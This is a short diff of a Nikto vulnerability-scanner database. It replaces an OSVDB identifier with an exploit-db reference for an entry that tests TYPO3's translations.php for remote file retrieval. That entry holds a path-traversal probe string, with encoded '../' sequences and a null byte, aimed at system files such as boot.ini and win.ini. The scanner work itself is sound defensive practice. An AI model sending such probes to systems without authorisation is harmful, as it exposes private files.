@@ -19,5 +19,5 @@
 # @TRAVWIN: boot.ini winnt/win.ini windows/win.ini
 # @TRAVALL: All of the above
 #######################################################################
-"nikto_id","osvdb_id","file","description"
-"521000","54058","typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/@TRAVALL%00","TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version."
+"nikto_id","references","file","description"
+"521000","https://www.exploit-db.com/exploits/22298","typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/@TRAVALL%00","TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version."
